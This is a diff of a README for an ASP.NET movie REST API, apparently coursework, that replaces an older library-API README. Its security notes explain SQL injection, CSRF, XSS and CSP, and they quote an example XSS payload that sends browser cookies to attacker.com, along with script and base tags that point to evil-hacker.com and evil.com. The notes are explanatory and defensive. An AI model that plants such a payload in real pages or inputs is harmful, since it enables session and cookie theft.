@@ -1,168 +1,97 @@
-# REST Library Service
+# REST Movie Service
 
-REST API for managing books, authors, and publishers.
+REST API for managing movies, directors and production companies
 
-## Requirements Coverage
+## Endpoints
+ - Movies: GetAll, GetByID, Create, Update and Delete
+ - Directors: GetAll, GetByID
+ - ProductionCompanies: GetAll, GetByID
+GetAll uses pagination
 
-Implemented endpoints:
-
-- Books: create, read by ID, list with pagination, update, delete
-- Authors: create, read by ID, list all, update, delete
-- Publishers: create, read by ID, list all, update, delete
-
-API tests are available in Postman collection format in [docs/postman-collection.json](docs/postman-collection.json).
 
 ## Tech Stack
+ASP.NET
+SQLite db file
+Entity Framework Core as ORM
 
-- Node.js + TypeScript
-- Express
-- Prisma
-- PostgreSQL
-- Vitest
-
-## Prerequisites
-
-- Docker
-
-## Getting Started
-
-1. Create a devcontainer environment file from the template:
-
+## Run with docker
 ```bash
-cd services/rest/.devcontainer
-cp .env-sample .env
+cd services/rest
+docker compose up -d
 ```
 
-2. Fill in the values in `.env`:
+### SQL Injection
+EF Core protects from SQL injection because it uses parameterized queries under the hood, so user input is never treated as raw SQL.
 
-- `POSTGRES_USER`
-- `POSTGRES_PW`
-- `POSTGRES_DB`
-- `PGADMIN_MAIL`
-- `PGADMIN_PW`
+### CSRF
+An attacker tricks a user’s browser into sending a request to another website
+For modern APIs that store API keys in headers or use OAuth CSRF is not a problem
 
-`DATABASE_URL` is already templated in `.env-sample`.
+### XSS (Cross-Site Scripting)
+The XSS process: 
+ - Injection: An attacker sends a malicious script via an API request (e.g., in a comment field, username, or profile description).
 
-3. Start the dev container:
+    Example payload: <script>fetch('https://attacker.com/steal?cookie=' + document.cookie)</script>
 
-Use VS Code command palette and run:
+ - Storage/Processing: The API receives the JSON payload and stores the malicious string in the database without sanitizing it.
 
-- `Dev Containers: Reopen in Container`
+ - Execution: A victim's browser requests data from the API. The frontend JavaScript receives the JSON and injects the malicious string directly into the DOM (e.g., using .innerHTML). The browser then executes the script.
 
-This starts the services defined in `.devcontainer/docker-compose.yml` (Node, Postgres, pgAdmin).
+#### XSS prevention
+string input Genre and title in Create and Update movie endpoints get sanitized using HtmlSanitizer installed with NuGet package.
+Content-Security-Policy (CSP) header is added to every response, it tells the browser which resources (scripts, styles, images) are allowed to be loaded and executed on a specific page
+How CSP header protects against XSS
 
-4. Install dependencies inside the container:
+XSS works by tricking a browser into executing malicious code. CSP prevents this in three main ways:
+1. Blocking Inline Scripts
 
+By default, a strong CSP blocks "inline" scripts—code written directly inside <script> tags or HTML attributes (like onclick).
+
+    The Attack: An attacker stores <script>alert('xss')</script> in your database.
+
+    The Protection: Even if the browser renders that tag, the CSP says "I don't allow inline scripts," and the browser ignores it.
+
+2. Restricting Trusted Domains
+
+If you do need scripts, you can specify exactly where they come from.
+
+    The Attack: An attacker tries to load a malicious file: <script src="https://evil-hacker.com/steal.js"></script>.
+
+    The Protection: Your CSP might say script-src 'self'. The browser checks the source, sees it isn't from your domain, and blocks the request.
+
+3. Disabling eval()
+
+CSP prevents the use of eval(), which turns strings into executable code. This closes a major loophole used by hackers to sneak scripts past basic filters.
+
+default-src 'none': Allow nothing but HTML unless explicitly allowed (no scripts, CSS, images, API calls, fonts, WebSocket connections, etc.)
+
+frame-ancestors 'none': Prevent the API from being embedded (e.g., <iframe>, <embed>)
+
+base-uri 'none': Prevent relative links to resolve to an attacker domain (e.g., by using a <base href="https://evil.com"> tag
+
+
+### Version strategy
+This API is using URI versioning, meaning the version is in the path api/v1/movies
+
+### CORS
+CORS is configured in program.cs where it allows any method from client "http://localhost:3000"
+CORS is applied in program.cs with app.UseCors("AllowFrontend");
+
+### jwt revocation strategy
+The API is using blacklisting because it is the most stateful strategy. When a user logs out the token gets stored in a redis database.
+To check if the token is stored in redis, use this command
 ```bash
-npm i
+docker exec -it <container-name> redis-cli
+127.0.0.1:6379> keys *
 ```
 
-5. Generate Prisma client, apply migrations, and seed:
+### Hypermedia as the engine of application state (HATEOAS)
+All endpoint implement HATEOAS with contextual links. It is using the convention HAL – Hypertext Application Language
 
-```bash
-npm run prepare
-```
+### Postman tests
+To run the tests you need two environment variables as seen in REST-API-V1-EXAMPEL-ENV.postman_environment
 
-6. Start the service:
 
-```bash
-npm start
-```
+### to do
 
-Server runs on `http://localhost:3000`.
-
-## Scripts
-
-- `npm start`: run the API (`tsx src/server.ts`)
-- `npm run prepare`: generate client, run migrations, seed DB
-- `npm test`: run tests once with coverage
-- `npm run test:watch`: run tests in watch mode
-- `npm run lint`: run ESLint
-
-## API Base URL
-
-`http://localhost:3000`
-
-## Endpoint Summary
-
-### Authors
-
-- `GET /authors`
-- `POST /authors`
-- `GET /authors/:id`
-- `PUT /authors/:id`
-- `DELETE /authors/:id`
-
-Create/Update payload:
-
-```json
-{
-	"name": "John",
-	"surname": "Doe"
-}
-```
-
-### Publishers
-
-- `GET /publishers`
-- `POST /publishers`
-- `GET /publishers/:id`
-- `PUT /publishers/:id`
-- `DELETE /publishers/:id`
-
-Create/Update payload:
-
-```json
-{
-	"name": "Penguin Books"
-}
-```
-
-### Books
-
-- `GET /books`
-- `POST /books`
-- `GET /books/:id`
-- `PUT /books/:id`
-- `DELETE /books/:id`
-
-Create/Update payload:
-
-```json
-{
-	"title": "Clean Code",
-	"publishingYear": 2008,
-	"authorId": 1,
-	"publishingCompanyId": 1
-}
-```
-
-Pagination for `GET /books`:
-
-- Query params used by current implementation: `pageNum`, `pageSize`
-- Example: `/books?pageNum=1&pageSize=10`
-- Offset behavior is derived as `(pageNum - 1) * pageSize`
-
-## Response Codes
-
-- `200 OK`: successful reads/updates
-- `201 Created`: successful create
-- `204 No Content`: successful delete
-- `400 Bad Request`: invalid or missing required fields
-- `404 Not Found`: resource does not exist
-
-## Testing
-
-### Automated tests
-
-```bash
-npm test
-```
-
-### Postman collection
-
-Import [docs/postman-collection.json](docs/postman-collection.json) and set:
-
-- `baseUrl` to `http://localhost:3000`
-
-Then run the collection.
+OpenAPI documentation 
